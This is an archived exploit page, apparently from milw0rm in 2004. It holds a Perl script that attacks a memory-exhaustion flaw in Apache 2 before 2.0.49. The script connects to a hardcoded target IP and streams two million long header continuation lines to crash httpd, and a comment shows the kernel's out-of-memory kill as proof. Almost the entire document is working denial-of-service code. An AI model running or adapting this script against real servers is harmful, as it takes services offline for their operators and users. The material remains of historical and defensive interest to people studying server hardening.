<html><head><title>Apache HTTPd Arbitrary Long HTTP Headers DoS</title></head><pre>#/usr/bin/perl
#
#exploit for apache ap_get_mime_headers_core() vuln
#
#adv is here: http://www.guninski.com/httpd1.html
#
#version: apache 2 &lt;2.0.49 apache 1 not tested.
#
#by bkbll bkbll#cnhonker.net http://www.cnhonker.com
#
#tail -f /var/log/messages
#Jul 1 17:43:16 www kernel: Out of Memory: Killed process 658 (httpd)
#

use IO::Socket::INET;

$host=&quot;10.10.10.114&quot;;
$port=80;
$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $host,PeerPort =&gt; $port, Proto =&gt; 'tcp') || die &quot;new error$@\n&quot;;
binmode($sock);
$hostname=&quot;Host: $host&quot;;
$buf2='A'x50;
$buf4='A'x8183;
$len=length($buf2);
$buf=&quot;GET / HTTP/1.1\r\n&quot;;
send($sock,$buf,0) || die &quot;send error:$@\n&quot;;
for($i= 0; $i &lt; 2000000; $i++)
{
    $buf=&quot; $buf4\r\n&quot;;
    send($sock,$buf,0) || die &quot;send error:$@, target maybe have been D.o.S?\n&quot;;
}
$buf=&quot;$hostname\r\n&quot;;
$buf.=&quot;Content-Length: $len\r\n&quot;;

$buf.=&quot;\r\n&quot;;
$buf.=$buf2.&quot;\r\n\r\n&quot;;

send($sock,$buf,0) || die &quot;send error:$@\n&quot;;
print &quot;Ok, our buffer have send to target \n&quot;;
close($sock);

# milw0rm.com [2004-07-22]</pre></html>